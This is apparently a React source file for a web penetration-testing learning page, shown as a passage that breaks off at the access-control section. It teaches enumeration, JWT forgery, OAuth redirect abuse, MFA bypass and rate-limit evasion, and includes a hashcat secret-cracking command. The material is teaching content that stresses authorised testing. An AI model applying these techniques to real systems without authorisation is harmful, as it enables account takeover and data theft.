import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  useMediaQuery,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Chip,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  Divider,
  Alert,
  Card,
  CardContent,
  Tooltip,
  Button,
  Drawer,
  Fab,
  LinearProgress,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import SecurityIcon from "@mui/icons-material/Security";
import SearchIcon from "@mui/icons-material/Search";
import LockIcon from "@mui/icons-material/Lock";
import BugReportIcon from "@mui/icons-material/BugReport";
import StorageIcon from "@mui/icons-material/Storage";
import WebIcon from "@mui/icons-material/Web";
import SyncAltIcon from "@mui/icons-material/SyncAlt";
import AssignmentIcon from "@mui/icons-material/Assignment";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import WarningIcon from "@mui/icons-material/Warning";
import InfoIcon from "@mui/icons-material/Info";
import GavelIcon from "@mui/icons-material/Gavel";
import MapIcon from "@mui/icons-material/Map";
import AccountTreeIcon from "@mui/icons-material/AccountTree";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import PersonSearchIcon from "@mui/icons-material/PersonSearch";
import TimerIcon from "@mui/icons-material/Timer";
import TokenIcon from "@mui/icons-material/Token";
import LinkIcon from "@mui/icons-material/Link";
import PhonelinkLockIcon from "@mui/icons-material/PhonelinkLock";
import AdminPanelSettingsIcon from "@mui/icons-material/AdminPanelSettings";
import DataObjectIcon from "@mui/icons-material/DataObject";
import CodeIcon from "@mui/icons-material/Code";
import TerminalIcon from "@mui/icons-material/Terminal";
import CloudIcon from "@mui/icons-material/Cloud";
import FolderIcon from "@mui/icons-material/Folder";
import UploadFileIcon from "@mui/icons-material/UploadFile";
import SpeedIcon from "@mui/icons-material/Speed";
import SettingsIcon from "@mui/icons-material/Settings";
import JavascriptIcon from "@mui/icons-material/Javascript";
import HttpIcon from "@mui/icons-material/Http";
import MouseIcon from "@mui/icons-material/Mouse";
import PolicyIcon from "@mui/icons-material/Policy";
import FactCheckIcon from "@mui/icons-material/FactCheck";
import LinkOffIcon from "@mui/icons-material/LinkOff";
import WifiIcon from "@mui/icons-material/Wifi";
import DescriptionIcon from "@mui/icons-material/Description";
import PriorityHighIcon from "@mui/icons-material/PriorityHigh";
import SchoolIcon from "@mui/icons-material/School";
import BuildIcon from "@mui/icons-material/Build";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";

interface TopicSection {
  title: string;
  icon: React.ReactNode;
  color: string;
  description: string;
  detailedDescription?: string;
  keyPoints: string[];
  techniques?: string[];
  tools?: string[];
  tips?: string[];
  cwe?: string[];
  beginnerTips?: string[];
  realWorldExample?: string;
  commonMistakes?: string[];
}

// Section 1: Overview and Methodology
const overviewTopics: TopicSection[] = [
  {
    title: "Scope and Rules of Engagement",
    icon: <GavelIcon />,
    color: "#6366f1",
    description: "Before any testing begins, establish clear boundaries and legal authorization to protect both tester and client.",
    detailedDescription: `The Rules of Engagement (RoE) document is arguably the most important document in any penetration testing engagement. It's your legal shield and the client's assurance that testing won't cause unintended damage. Think of it as a contract between you and the organization that explicitly states what you can and cannot do.

Without proper authorization, penetration testing is indistinguishable from criminal hacking. Even well-intentioned security researchers have faced prosecution for testing without explicit written permission. The Computer Fraud and Abuse Act (CFAA) in the United States, the Computer Misuse Act in the UK, and similar laws worldwide can result in severe penalties including imprisonment.

A comprehensive scope document should clearly define: (1) which systems, networks, and applications are in-scope for testing, (2) which are explicitly out-of-scope (production databases, third-party services, critical infrastructure), (3) the testing window and any blackout periods, (4) acceptable testing techniques, (5) communication protocols for discovered critical vulnerabilities, and (6) data handling requirements.

Many organizations use cloud services like AWS, Azure, or GCP in addition to third-party SaaS providers. These services often have their own penetration testing policies. AWS, for example, requires notification for certain types of testing. Cloudflare-protected sites may trigger bot detection during scanning. Always identify and address these considerations before testing begins.

The scope document should also establish "get out of jail free" letters - written authorization from someone with legal authority to approve testing. This protects you if alarms are triggered or if testing is mistaken for a real attack by the organization's security team.`,
    realWorldExample: "In 2019, two penetration testers working for Coalfire were arrested in Iowa while conducting an authorized physical security assessment of a courthouse. Despite having a signed contract, local law enforcement arrested them because the contract didn't explicitly authorize breaking and entering. This case highlights the importance of extremely specific scope documents that account for all testing activities.",
    beginnerTips: [
      "Always get scope documents signed before ANY testing begins - even initial reconnaissance",
      "Take screenshots of your authorization documents and keep them accessible during testing",
      "When in doubt about whether something is in-scope, ask the client first",
      "Document all your activities with timestamps - this protects you if questions arise later",
      "Establish a secure communication channel (encrypted email, Signal) for reporting critical findings"
    ],
    keyPoints: [
      "Obtain written authorization (Get Out of Jail Free letter)",
      "Define in-scope and out-of-scope systems, IPs, and domains",
      "Clarify testing windows and blackout periods",
      "Establish emergency contact procedures",
      "Agree on acceptable testing techniques (DoS, social engineering, etc.)",
      "Define data handling and confidentiality requirements",
      "Set up secure communication channels for findings",
    ],
    tips: [
      "Always keep authorization documents accessible during testing",
      "Document everything with timestamps for legal protection",
      "Clarify third-party hosted services (AWS, Cloudflare) - they may need separate authorization",
      "Understand local laws regarding penetration testing",
    ],
  },
  {
    title: "Reconnaissance and Application Mapping",
    icon: <MapIcon />,
    color: "#8b5cf6",
    description: "Systematically discover and document all application components, endpoints, and technologies.",
    detailedDescription: `Reconnaissance is the foundation of effective penetration testing. The more you know about your target before attempting exploitation, the higher your chances of finding significant vulnerabilities. Professional pentesters typically spend 30-40% of their total engagement time on reconnaissance.

Passive reconnaissance involves gathering information without directly interacting with the target. This includes OSINT (Open Source Intelligence) techniques like searching public records, social media, job postings (which reveal technology stacks), and historical data from the Wayback Machine. Certificate Transparency logs reveal all SSL certificates issued for a domain, potentially exposing internal subdomains. DNS records (MX, TXT, CNAME) can reveal email providers, cloud services, and infrastructure details.

Active reconnaissance involves directly probing the target. This includes port scanning with Nmap to identify open services, directory brute-forcing to find hidden endpoints, and technology fingerprinting to identify frameworks and versions. Burp Suite's spider can crawl the application to map all accessible pages, while manual browsing often reveals functionality that automated tools miss.

Modern applications often expose significant functionality through JavaScript files. Analyzing JS bundles can reveal API endpoints, authentication mechanisms, and sometimes even API keys or internal documentation URLs. Tools like LinkFinder and relative-url-extractor can automate this process.

Subdomain enumeration is critical for understanding the full attack surface. Organizations often have development, staging, or internal subdomains that are less secured than production. Tools like Amass, Subfinder, and SecurityTrails can discover hundreds of subdomains that might not be obvious.`,
    realWorldExample: "During a bug bounty engagement, a researcher discovered a forgotten \"staging-api.company.com\" subdomain through certificate transparency logs. The staging environment had the same functionality as production but lacked rate limiting and had debug mode enabled, exposing verbose error messages that revealed the database structure. The researcher used this information to find and report a critical SQL injection vulnerability worth $15,000.",
    beginnerTips: [
      "Create a systematic checklist and follow it for every engagement to ensure thorough coverage",
      "Document everything you find in a structured format - you'll reference it throughout testing",
      "Don't rush reconnaissance - finding a forgotten staging server can be more valuable than hours of exploitation attempts",
      "Use multiple tools for the same task (e.g., both Amass and Subfinder for subdomains) as they often find different results",
      "Check robots.txt and sitemap.xml - they often reveal sensitive directories developers don't want indexed"
    ],
    commonMistakes: [
      "Skipping passive recon and jumping straight to active scanning - this misses valuable OSINT",
      "Not checking historical versions of the site on Wayback Machine",
      "Forgetting to enumerate virtual hosts on shared hosting",
      "Missing JavaScript file analysis which often contains hidden endpoints and secrets"
    ],
    keyPoints: [
      "Passive recon: OSINT, DNS records, certificate transparency logs",
      "Active scanning: port scanning, service enumeration",
      "Technology fingerprinting: server, frameworks, libraries",
      "Endpoint discovery: spidering, directory brute-forcing",
      "API documentation discovery (Swagger, GraphQL introspection)",
      "JavaScript analysis for hidden endpoints and secrets",
      "Subdomain enumeration and virtual host discovery",
    ],
    tools: ["Burp Suite", "OWASP ZAP", "Nmap", "Gobuster", "ffuf", "Amass", "Subfinder", "Nuclei", "httpx", "waybackurls"],
    techniques: [
      "robots.txt and sitemap.xml analysis",
      "Google dorking for sensitive files",
      "GitHub/GitLab secret scanning",
      "Shodan/Censys for exposed services",
      "WHOIS and reverse IP lookups",
    ],
  },
  {
    title: "Threat Modelling and Attack Surface",
    icon: <AccountTreeIcon />,
    color: "#ec4899",
    description: "Identify and prioritize potential attack vectors based on application architecture and business logic.",
    detailedDescription: `Threat modeling is the process of systematically identifying and prioritizing potential threats to an application. Rather than testing every possible vulnerability type against every endpoint, threat modeling helps you focus your limited testing time on the areas most likely to yield significant findings.

The attack surface is the sum of all points where an attacker can try to enter or extract data from a system. For web applications, this includes: (1) all user input fields (forms, APIs, file uploads), (2) authentication and session management mechanisms, (3) API endpoints and their parameters, (4) file system interactions, (5) database queries, (6) third-party integrations, and (7) administrative interfaces.

STRIDE is a popular threat modeling framework that categorizes threats into six types: Spoofing (pretending to be someone else), Tampering (modifying data or code), Repudiation (denying actions taken), Information Disclosure (exposing confidential data), Denial of Service (making systems unavailable), and Elevation of Privilege (gaining unauthorized access levels). For each component of the application, consider which STRIDE categories apply.

Business logic flaws deserve special attention during threat modeling. These are vulnerabilities that automated scanners cannot detect because they require understanding the application's intended behavior. Examples include: bypassing payment by manipulating cart totals, accessing other users' data through predictable identifiers, or exploiting race conditions in financial transactions.

Prioritize testing based on: (1) Potential impact - what's the worst-case scenario if this component is compromised? (2) Likelihood of vulnerability - is this using known-vulnerable technology? (3) Exposure - is this internet-facing or internal? (4) Business criticality - does this handle sensitive data or financial transactions?`,
    realWorldExample: "A financial application threat model revealed that the wire transfer endpoint accepted user-supplied amounts without server-side validation. The client-side JavaScript enforced maximum transfer limits, but by modifying the request directly, testers discovered they could initiate transfers of any amount. This business logic flaw would never have been found by automated scanning.",
    beginnerTips: [
      "Draw data flow diagrams showing how user input moves through the application",
      "Identify trust boundaries - where does data move from untrusted to trusted zones?",
      "Ask: 'What's the worst thing that could happen if an attacker controlled this input?'",
      "Prioritize authentication, authorization, and payment/financial functionality first",
      "Consider both external attackers and malicious insiders in your threat model"
    ],
    keyPoints: [
      "Map data flows between components",
      "Identify trust boundaries and authentication points",
      "Document entry points (forms, APIs, file uploads)",
      "Assess business-critical functionality",
      "Consider insider threat scenarios",
      "Map third-party integrations and dependencies",
      "Prioritize testing based on risk and impact",
    ],
    techniques: [
      "STRIDE threat modelling (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation)",
      "Attack trees for complex scenarios",
      "Data flow diagrams (DFDs)",
      "PASTA (Process for Attack Simulation and Threat Analysis)",
    ],
  },
];

// Section 2: Authentication and Authorization
const authTopics: TopicSection[] = [
  {
    title: "Authentication Models",
    icon: <VpnKeyIcon />,
    color: "#3b82f6",
    description: "Understanding different authentication mechanisms and their common weaknesses.",
    detailedDescription: `Authentication is the process of verifying that a user is who they claim to be. It's the first line of defense for any web application, and weaknesses here can lead to complete account compromise. Understanding how different authentication mechanisms work is essential for finding vulnerabilities in them.

**Form-based Authentication** is the most common model. Users submit credentials via an HTML form, typically over HTTPS. The server validates credentials against a database (hopefully using hashed passwords with salt) and issues a session token. Vulnerabilities include: weak password policies, credential transmission over HTTP, SQL injection in login queries, and enumeration via error messages.

**HTTP Basic Authentication** sends credentials in the Authorization header as base64-encoded "username:password". While simple to implement, it's inherently insecure without HTTPS because credentials are sent with every request and can be easily decoded. HTTP Digest improves on this by using MD5 hashing, but is still considered weak by modern standards.

**Token-based Authentication (Bearer Tokens/JWTs)** is prevalent in modern APIs and SPAs. Instead of maintaining server-side sessions, the server issues a signed token containing user claims. The client sends this token with each request. This enables stateless authentication but introduces new attack vectors like algorithm confusion, weak secrets, and token theft.

**Passwordless Authentication** (magic links, WebAuthn, passkeys) eliminates passwords entirely. Magic links send a time-limited login URL to the user's email. WebAuthn uses public-key cryptography with hardware security keys or biometrics. These are generally more secure than passwords but have their own considerations (email security for magic links, device availability for WebAuthn).

**Risk-based/Adaptive Authentication** dynamically adjusts authentication requirements based on risk signals like device fingerprint, location, behavior patterns, and request characteristics. A login from a new device in a foreign country might require additional verification.`,
    realWorldExample: "A SaaS application used HTTP Basic Auth for its API endpoints serving mobile apps. During testing, we discovered the mobile app was pinning to an old SSL certificate but would fall back to HTTP if HTTPS failed. By performing a TLS downgrade attack on a coffee shop WiFi network, we captured valid credentials for multiple users, demonstrating why Basic Auth should never be trusted even with assumed HTTPS.",
    beginnerTips: [
      "Always check if the application falls back to HTTP or has mixed content issues",
      "Test what happens when you submit credentials - check for timing differences between valid/invalid usernames",
      "Look for password policies enforced only client-side (JavaScript) that can be bypassed",
      "Check if 'remember me' functionality creates long-lived tokens without proper expiration",
      "Test OAuth/SSO implementations separately - they have their own vulnerability classes"
    ],
    commonMistakes: [
      "Assuming HTTPS means credentials are always protected - TLS can be misconfigured",
      "Not testing API authentication separately from web authentication",
      "Forgetting to check password reset, registration, and account recovery flows"
    ],
    keyPoints: [
      "Form-based authentication: username/password flows",
      "HTTP Basic and Digest authentication",
      "Certificate-based (mutual TLS) authentication",
      "API key authentication patterns",
      "Token-based authentication (Bearer tokens)",
      "Passwordless authentication (magic links, WebAuthn)",
      "Risk-based and adaptive authentication",
    ],
    techniques: [
      "Test for default credentials",
      "Check password policy enforcement",
      "Verify account lockout mechanisms",
      "Test remember-me functionality security",
      "Assess password reset flows",
    ],
  },
  {
    title: "Enumeration and Brute Force",
    icon: <PersonSearchIcon />,
    color: "#ef4444",
    description: "Techniques to discover valid accounts and bypass authentication through credential attacks.",
    detailedDescription: `Username enumeration allows attackers to determine which usernames exist in a system. This information is valuable because it reduces a brute force attack from guessing both username AND password to just guessing the password. Applications leak valid usernames through various channels, often unintentionally.

**Error Message Enumeration**: The most common leak. If the login page says "Invalid password" for valid users but "User not found" for invalid users, an attacker can easily enumerate accounts. Modern best practice is to use generic messages like "Invalid username or password" regardless of which was wrong.

**Timing-based Enumeration**: Even with identical error messages, the response time may differ. If the application hashes the password for valid users (which takes time) but returns immediately for invalid users, the timing difference can reveal valid accounts. A difference of even 50-100ms can be detected with enough samples.

**Registration and Password Reset**: Don't forget to check these flows! "This email is already registered" during signup or "No account found with this email" during password reset are enumeration goldmines that developers often overlook while securing the login page.

**Response Size/Content Analysis**: Even with similar messages, response sizes may differ slightly (different HTML comments, error codes, or redirect URLs). Burp Intruder's response comparison features help identify these subtle differences.

**Password Spraying vs Credential Stuffing**: Password spraying tries a small number of common passwords against many accounts (avoiding lockouts). Credential stuffing uses breached username/password pairs from other sites. Both can be highly effective - password spraying especially against organizations that don't enforce strong password policies.

**Rate Limiting Bypass**: Applications often implement rate limiting to prevent brute force, but these controls can sometimes be bypassed. Techniques include: rotating IP addresses, using the X-Forwarded-For header to spoof IPs, modifying the username slightly (adding spaces, using email aliases like user+tag@domain.com), or targeting password reset tokens instead of login.`,
    realWorldExample: "During testing of a healthcare portal, we noticed the login page consistently returned in ~200ms for invalid users but ~350ms for valid ones (due to bcrypt password hashing). Using Burp Intruder with a list of common names, we enumerated 47 valid staff accounts in under an hour. Combined with password spraying using 'CompanyName2024!', we achieved access to 3 accounts that hadn't changed their default passwords.",
    beginnerTips: [
      "Always test multiple endpoints: login, registration, password reset, and API authentication",
      "Use Burp's Intruder 'Cluster Bomb' attack to test username:password combinations efficiently",
      "Document response differences carefully - sometimes the difference is a single character or milliseconds",
      "Check if the application implements account lockout and test the lockout duration",
      "Try adding headers like X-Forwarded-For or X-Real-IP to bypass IP-based rate limiting"
    ],
    commonMistakes: [
      "Only testing the login page and forgetting about registration and password reset",
      "Not collecting enough response samples to identify timing-based enumeration",
      "Triggering account lockouts without first documenting the lockout threshold and duration"
    ],
    keyPoints: [
      "Username enumeration via error messages",
      "Timing-based user enumeration",
      "Password spraying vs credential stuffing",
      "Rate limiting bypass techniques",
      "CAPTCHA bypass methods",
      "Account lockout policy testing",
      "Response analysis for enumeration",
    ],
    tools: ["Hydra", "Burp Intruder", "ffuf", "Patator", "CeWL", "Turbo Intruder"],
    tips: [
      "Check registration, login, and password reset for enumeration",
      "Compare response times, sizes, and content",
      "Try IP rotation and header manipulation for rate limit bypass",
      "Test with common password lists (rockyou, SecLists)",
    ],
    cwe: ["CWE-307: Improper Restriction of Excessive Authentication Attempts"],
  },
  {
    title: "Session Management",
    icon: <TimerIcon />,
    color: "#f59e0b",
    description: "Testing session token generation, handling, and termination for security flaws.",
    detailedDescription: `Session management is how web applications maintain state and user identity across multiple HTTP requests. Since HTTP is stateless, applications use session tokens (typically stored in cookies) to track authenticated users. Weaknesses in session management can lead to session hijacking, allowing attackers to impersonate legitimate users.

**Session Token Entropy**: Session IDs must be unpredictable. If tokens follow a pattern, are sequential, or have insufficient randomness, attackers can guess valid session IDs. Modern frameworks typically generate secure random tokens, but custom implementations often fail. Burp's Sequencer tool can analyze token randomness by collecting many samples and performing statistical tests.

**Cookie Security Attributes**: Secure cookies are essential. The **Secure** flag ensures the cookie is only sent over HTTPS. The **HttpOnly** flag prevents JavaScript access, mitigating XSS-based session theft. The **SameSite** attribute (Strict/Lax/None) controls when cookies are sent with cross-site requests, providing CSRF protection. Missing any of these attributes is a finding worth reporting.

**Session Fixation**: In this attack, the attacker obtains a valid session token (by visiting the application themselves), then tricks a victim into authenticating with that token. If the application doesn't regenerate the session ID after login, the attacker's token becomes associated with the victim's authenticated session. Always test that session tokens change after authentication state changes.

**Session Timeout**: Both absolute timeout (maximum session lifetime regardless of activity) and idle timeout (expires after period of inactivity) should be implemented and appropriate for the application's sensitivity. Banking applications might have 15-minute idle timeouts, while social media might allow weeks.

**Session Termination**: When users log out, the server must invalidate the session token, not just delete the client-side cookie. Test this by capturing a session token, logging out, and then trying to use the captured token. Many applications fail this test, allowing session tokens to remain valid perpetually.`,
    realWorldExample: "A penetration test of an e-commerce platform revealed that session tokens were being generated using PHP's uniqid() function, which produces predictable values based on system time. By observing the pattern over several requests, we could predict future session IDs with high accuracy. Combined with the fact that the site didn't regenerate sessions on login, we demonstrated the ability to hijack any session created within a specific time window.",
    beginnerTips: [
      "Always use Burp Sequencer to test token randomness - aim for >112 bits of entropy",
      "Check all three cookie flags: Secure, HttpOnly, and SameSite",
      "Test session regeneration after: login, logout, privilege escalation, and password change",
      "Verify logout actually invalidates the session server-side, not just client-side",
      "Test concurrent session handling - can users be logged in from multiple locations simultaneously?"
    ],
    commonMistakes: [
      "Assuming framework defaults are secure - always verify cookie attributes",
      "Not testing what happens to sessions when user roles or permissions change",
      "Forgetting to test session handling in mobile APIs which may use different mechanisms"
    ],
    keyPoints: [
      "Session token entropy and predictability",
      "Secure cookie attributes (HttpOnly, Secure, SameSite)",
      "Session fixation vulnerabilities",
      "Session timeout and idle timeout",
      "Concurrent session handling",
      "Session termination on logout",
      "Session regeneration after privilege changes",
    ],
    techniques: [
      "Analyze token randomness with Burp Sequencer",
      "Test session persistence across authentication events",
      "Check for session tokens in URLs (session ID exposure)",
      "Verify logout actually invalidates server-side session",
      "Test cross-device/cross-browser session handling",
    ],
    cwe: ["CWE-384: Session Fixation", "CWE-613: Insufficient Session Expiration"],
  },
  {
    title: "JWT Security",
    icon: <TokenIcon />,
    color: "#10b981",
    description: "Common vulnerabilities in JSON Web Token implementations and how to exploit them.",
    detailedDescription: `JSON Web Tokens (JWTs) are a popular method for implementing stateless authentication in modern web applications and APIs. A JWT consists of three base64-encoded parts separated by dots: header (algorithm and type), payload (claims like user ID, roles, expiration), and signature. Understanding JWT structure is crucial because many serious vulnerabilities arise from implementation mistakes.

**Algorithm Confusion (None Attack)**: The most famous JWT vulnerability. JWTs support multiple algorithms including 'none' (no signature). If a server accepts tokens with alg='none', an attacker can forge any token. Test by changing the header to {"alg":"none","typ":"JWT"}, removing the signature, and sending the modified token.

**RS256 to HS256 Confusion**: RS256 uses asymmetric encryption (public/private key pair). HS256 uses symmetric encryption (shared secret). If a server's JWT library accepts both, an attacker can take the public key (which is public), change the algorithm to HS256, and sign the token using the public key as the HMAC secret. The server then verifies using its public key as if it were an HMAC secret, accepting the forged token.

**Weak HMAC Secrets**: Many applications use weak or default secrets for HS256 signing. Tools like hashcat can crack JWT secrets offline at millions of attempts per second. Common weak secrets include: 'secret', 'jwt_secret', the application name, or short random strings. Once cracked, the attacker can generate any JWT they want.

**JWT Header Injection (jku, jwk, kid)**: The JWT header can contain parameters that tell the server where to find the key for verification. **jku** (JWK Set URL) specifies a URL to fetch the signing key. **jwk** embeds the key directly in the header. **kid** (Key ID) references which key to use. Attackers can inject values pointing to attacker-controlled keys. Test by setting jku to your server and seeing if the application fetches your malicious key.

**Sensitive Data in Payload**: JWTs are encoded, not encrypted. Anyone can decode the payload (base64 is not encryption). Sensitive data like passwords, SSNs, or internal IDs should never appear in JWT claims. Always decode and inspect JWT payloads during testing.

**No Expiration or Long Expiration**: JWTs should have reasonable 'exp' (expiration) claims. Without expiration, stolen tokens remain valid forever. Some applications set extremely long expirations (years) which is nearly as bad. Also test if the server actually validates the expiration or ignores it.`,
    realWorldExample: "An API security assessment revealed the target used JWTs with RS256 but the library accepted algorithm changes. We extracted the public key from their /.well-known/jwks.json endpoint, crafted a new JWT with admin: true in the payload and alg: HS256 in the header, then signed it using the public key as the HMAC secret. The server accepted our forged admin token, demonstrating complete authentication bypass.",
    beginnerTips: [
      "Use jwt.io to decode and understand JWT structure before testing",
      "jwt_tool by ticarpi automates most JWT attacks - learn it well",
      "Always check if the server accepts tokens with alg: 'none'",
      "Try cracking the secret with hashcat: hashcat -a 0 -m 16500 jwt.txt wordlist.txt",
      "Look for secrets in source code, config files, and environment variables"
    ],
    commonMistakes: [
      "Only testing the current algorithm without trying algorithm switching",
      "Not checking for sensitive data in the JWT payload",
      "Forgetting to test token refresh and revocation mechanisms"
    ],
    keyPoints: [
      "Algorithm confusion attacks (none, HS256 vs RS256)",
      "Weak secret keys vulnerable to brute force",
      "Missing signature verification",
      "JWT header injection (jku, jwk, kid)",
      "Expired token acceptance",
      "Sensitive data in JWT payload",
      "Token replay and revocation issues",
    ],
    tools: ["jwt.io", "jwt_tool", "Burp JWT extensions", "hashcat (for cracking)"],
    techniques: [
      "Change alg to 'none' and remove signature",
      "Switch RS256 to HS256 and sign with public key",
      "Brute force weak HMAC secrets",
      "Inject malicious JWKS URL via jku header",
      "SQL injection via kid parameter",
    ],
    cwe: ["CWE-347: Improper Verification of Cryptographic Signature"],
  },
  {
    title: "OAuth and SSO Vulnerabilities",
    icon: <LinkIcon />,
    color: "#8b5cf6",
    description: "Security testing for OAuth 2.0, OpenID Connect, and Single Sign-On implementations.",
    detailedDescription: `OAuth 2.0 is the de facto standard for delegated authorization, while OpenID Connect (OIDC) builds on OAuth for authentication. These protocols enable "Login with Google/Facebook/GitHub" functionality and enterprise Single Sign-On (SSO). Their complexity creates numerous opportunities for security vulnerabilities.

**Understanding the OAuth Flow**: In the Authorization Code flow (most secure), the user is redirected to the authorization server (AS), authenticates, and is redirected back to the client application with an authorization code. The client then exchanges this code for an access token via a back-channel request. Each step has potential vulnerabilities.

**Open Redirect in redirect_uri**: The redirect_uri parameter tells the AS where to send the user after authentication. If validation is weak, attackers can redirect to their server to steal the authorization code. Test variations like: subdomain attacks (evil.authorized-domain.com), path traversal (/authorized/../evil), parameter pollution (?redirect_uri=auth&redirect_uri=evil), and URL encoding tricks. Even open redirects on the legitimate site can be chained.

**Missing or Weak State Parameter**: The state parameter prevents CSRF attacks on OAuth flows. Without it, an attacker can craft a malicious authorization URL that links the victim's account to the attacker's identity on another service. Test by removing state, using predictable values, or checking if the server validates it.

**Token Leakage**: Access tokens in URL fragments can leak via Referer headers, browser history, or logs. The Implicit flow (deprecated) puts tokens directly in URLs. Even with Authorization Code flow, misconfigured redirect_uri handling can expose codes. Check if tokens appear in URLs, logs, or error messages.

**PKCE (Proof Key for Code Exchange)**: PKCE was introduced to protect mobile apps where client secrets can't be securely stored. It uses a code_verifier/code_challenge pair. However, some implementations don't properly validate PKCE or allow it to be bypassed entirely.

**IdP Confusion and Account Linking**: When applications support multiple identity providers, logic flaws can allow attackers to link their account to a victim's by manipulating the authentication flow or account linking features.`,
    realWorldExample: "A bug bounty researcher discovered that a major social platform's OAuth implementation only validated the domain of redirect_uri, not the full path. By finding an open redirect vulnerability on an authorized domain (company.com/redirect?url=evil.com), they chained the two vulnerabilities: the OAuth flow redirected to company.com/redirect with the auth code, which then redirected to evil.com, leaking the authorization code. This earned a $10,000 bounty.",
    beginnerTips: [
      "Use a dedicated OAuth testing lab (like PortSwigger's Web Security Academy) to learn safely",
      "Always test redirect_uri with subdomain, path, and parameter variations",
      "If you find an open redirect anywhere on the authorized domain, try to chain it with OAuth",
      "Check if the state parameter is present, validated, and tied to the user's session",
      "Test what happens if you use an authorization code twice - proper implementations reject reuse"
    ],
    commonMistakes: [
      "Only testing the documented OAuth endpoints without looking for hidden or debug endpoints",
      "Not testing account linking and unlinking flows for IDOR/authorization issues",
      "Forgetting to test the token refresh flow and refresh token security"
    ],
    keyPoints: [
      "Open redirect in redirect_uri parameter",
      "Authorization code interception",
      "CSRF in OAuth flows (missing state parameter)",
      "Token leakage via Referer header",
      "Scope escalation and privilege manipulation",
      "Client secret exposure",
      "PKCE bypass attempts",
      "IdP confusion and account linking issues",
    ],
    techniques: [
      "Test redirect_uri validation (subdomain, path traversal, parameter pollution)",
      "Attempt to reuse authorization codes",
      "Check for token in URL fragments vs query params",
      "Test implicit flow token exposure",
      "Verify state parameter uniqueness and binding",
    ],
    cwe: ["CWE-601: URL Redirection to Untrusted Site"],
  },
  {
    title: "Multi-Factor Authentication",
    icon: <PhonelinkLockIcon />,
    color: "#06b6d4",
    description: "Bypass techniques and weaknesses in MFA implementations.",
    detailedDescription: `Multi-Factor Authentication (MFA) combines two or more authentication factors: something you know (password), something you have (phone, hardware key), and something you are (biometrics). While MFA significantly improves security, implementation weaknesses can often be exploited to bypass it entirely.

**Direct Endpoint Access**: The most common MFA bypass occurs when the application doesn't properly enforce MFA before granting access to protected resources. After entering valid credentials, users are typically redirected to an MFA challenge page. However, if you capture the session cookie after password authentication but before MFA completion, you might be able to directly access authenticated pages by skipping the MFA step. Always test by authenticating, then trying to access protected endpoints before completing MFA.

**Response Manipulation**: Some poorly implemented MFA checks can be bypassed by manipulating the server response. If the MFA verification endpoint returns {"success":false} on failure, try changing it to {"success":true} before it reaches the browser. Tools like Burp Suite's Match and Replace feature make this trivial.

**OTP Brute Force**: Time-based OTPs (TOTP) are typically 6 digits, meaning only 1 million possible combinations. Without rate limiting, this can be brute-forced in minutes. Test rate limiting by submitting multiple incorrect codes rapidly. Some applications block after X attempts from one IP but can be bypassed with IP rotation. Also test if the OTP window is too long (accepting codes from 5+ time windows increases attack surface).

**MFA Fatigue/Push Bombing**: For push notification-based MFA (like Duo, Okta Verify, Microsoft Authenticator), attackers can repeatedly trigger authentication requests until an exhausted or frustrated user approves one. This technique was used in the 2022 Uber breach.

**Backup Code Weaknesses**: Most MFA implementations provide backup codes for recovery. Test: (1) Are backup codes properly single-use? (2) What's the entropy - can they be brute-forced? (3) Are they exposed anywhere (account settings, emails, logs)? (4) Can generating new backup codes be done without re-authentication?

**SMS-Based MFA Vulnerabilities**: SMS verification is vulnerable to SIM swapping (social engineering carrier support), SS7 protocol exploitation (intercepting SMS), and malware on the victim's phone. While pentesting typically can't demonstrate these, it's worth noting SMS-based MFA is considered weak.

**Recovery Flow Bypasses**: Password reset and account recovery flows often bypass MFA entirely. "Forgot password" might send a reset link without requiring MFA. Test all account recovery mechanisms and ensure MFA is enforced consistently.`,
    realWorldExample: "In the Uber breach of 2022, attackers obtained stolen credentials and used MFA fatigue - bombarding an employee with push notification MFA requests for over an hour. Eventually, the employee approved a push notification, perhaps accidentally or just to make them stop. Combined with social engineering claiming to be IT support, this gave the attacker full access to Uber's internal systems.",
    beginnerTips: [
      "After password authentication but before MFA, save the session token and try accessing protected pages directly",
      "Use Burp Intruder to test rate limiting on OTP submissions - try from multiple IPs if blocked",
      "Check if MFA can be disabled from account settings without requiring current MFA verification",
      "Test backup codes for reuse, low entropy, and exposure in the UI or API responses",
      "Examine the response for MFA success/failure and try manipulating it with Burp's Match & Replace"
    ],
    commonMistakes: [
      "Only testing the primary MFA flow and not recovery/backup options",
      "Not testing if disabling MFA requires MFA verification",
      "Forgetting that 'remember this device' features may bypass MFA and should be tested"
    ],
    keyPoints: [
      "MFA bypass via direct endpoint access",
      "Brute forcing OTP codes",
      "Response manipulation to skip MFA",
      "Backup code weaknesses",
      "MFA fatigue attacks (push notification spam)",
      "SIM swapping and SS7 attacks on SMS MFA",
      "Recovery flow bypasses",
    ],
    techniques: [
      "Check if MFA can be disabled without re-authentication",
      "Test rate limiting on OTP submission",
      "Attempt to access authenticated endpoints without completing MFA",
      "Manipulate response to indicate MFA success",
      "Test backup codes for reuse and entropy",
    ],
  },
  {
    title: "Access Control, IDOR, and BOLA",
    icon: <AdminPanelSettingsIcon />,
    color: "#dc2626",
    description: "Broken Object Level Authorization and Insecure Direct Object References testing.",
    detailedDescription: `Access control vulnerabilities are consistently ranked among the most critical and prevalent security issues. IDOR (Insecure Direct Object Reference) and BOLA (Broken Object Level Authorization) refer to the same fundamental flaw: the application doesn't verify that the authenticated user is authorized to access the specific resource they're requesting.

